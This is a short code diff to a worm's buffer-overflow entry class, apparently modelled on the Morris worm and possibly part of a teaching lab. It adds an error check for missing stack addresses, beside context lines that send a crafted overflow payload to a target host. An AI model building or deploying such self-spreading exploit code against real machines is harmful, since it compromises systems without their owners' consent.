@@ -192,6 +192,11 @@ class MorrisBofEntry:
 
         Returns "arrived", "already", or None when the machine never answered.
         """
+        if self.ebp is None or self.buf is None:
+            raise RuntimeError(
+                "no addresses for `stack` on this host: the launcher did not measure them, "
+                "or they did not reach this copy of the worm"
+            )
         worm = self._worm
         mine = worm.my_ip_toward(target)
         worm.exchange(target, self.port, self.badfile(mine, worm.announce_port), wait=3)
